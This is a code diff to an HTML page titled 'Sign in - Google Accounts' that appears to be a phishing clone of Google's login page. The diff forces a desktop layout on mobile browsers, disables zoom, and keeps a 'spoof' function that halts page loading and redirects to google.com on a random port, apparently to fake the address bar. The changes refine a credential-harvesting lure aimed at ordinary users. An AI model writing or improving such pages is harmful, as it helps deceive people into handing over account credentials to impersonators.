@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- FIX: Force desktop viewport -->
+    <meta name="viewport" content="width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sign in - Google Accounts</title>
 
     <!-- FIXED: Script Tailwind harus tanpa escape -->
@@ -19,6 +20,26 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            /* Prevent mobile scrolling */
+            overflow-x: hidden;
+            min-width: 1200px;
+        }
+
+        /* Force desktop layout */
+        @media (max-width: 1199px) {
+            body::before {
+                content: "Please switch to desktop mode for best experience";
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                background: #ffcc00;
+                color: #000;
+                text-align: center;
+                padding: 10px;
+                z-index: 9999;
+                font-weight: bold;
+            }
         }
 
         .login-container {
@@ -32,6 +53,8 @@
             max-width: 400px;
             text-align: center;
             box-sizing: border-box;
+            /* Ensure container stays desktop size */
+            transform-origin: top center;
         }
 
         .input-field {
@@ -115,7 +138,37 @@
 
     <!-- FIXED: Script dipindah ke bawah -->
 <script>
-    showDesktopModeInstructions();
+    // Force desktop mode on all devices
+    function forceDesktopMode() {
+        // Set viewport for desktop
+        const viewportMeta = document.querySelector('meta[name="viewport"]');
+        if (viewportMeta) {
+            viewportMeta.content = "width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no";
+        }
+        
+        // Prevent mobile zooming
+        document.addEventListener('touchmove', function(e) {
+            if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        
+        // Disable double tap zoom
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(e) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                e.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+        
+        // Force desktop user agent if possible (for browsers that allow it)
+        if (navigator.userAgent.match(/Mobile|Android|iPhone|iPad|iPod/i)) {
+            console.log("Mobile device detected - forcing desktop layout");
+        }
+    }
+    
     function spoof() {
         setTimeout(() => {
             window.stop();
@@ -126,9 +179,15 @@
             document.location = "https://google.com:" + randomPort + "/";
         }, 300);
     }
-    spoof();
+    
+    // Initialize desktop mode immediately
+    document.addEventListener('DOMContentLoaded', function() {
+        forceDesktopMode();
+        spoof();
+    });
+    
+    // Also run on window load for safety
+    window.addEventListener('load', forceDesktopMode);
 </script>
 </body>
 </html>
-
-<!-- jangan di colong -->
